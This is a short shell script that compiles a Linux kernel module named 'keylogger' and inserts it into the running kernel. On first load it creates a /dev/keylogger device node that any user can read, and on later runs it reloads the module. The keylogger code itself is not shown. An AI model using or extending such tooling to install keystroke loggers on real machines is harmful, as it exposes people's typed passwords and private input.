#!/bin/sh

MODULE="keylogger"

if lsmod | grep "$MODULE" &> /dev/null ; then
    make clean
    make -j 8 -C /lib/modules/$(uname -r)/build M=$PWD
    rmmod keylogger
    insmod ./keylogger.ko
else
    mknod -m 666 /dev/keylogger c 240 0
    make clean
    make -j 8 -C /lib/modules/$(uname -r)/build M=$PWD
    insmod ./keylogger.ko
fi

echo "$MODULE loaded!"

exit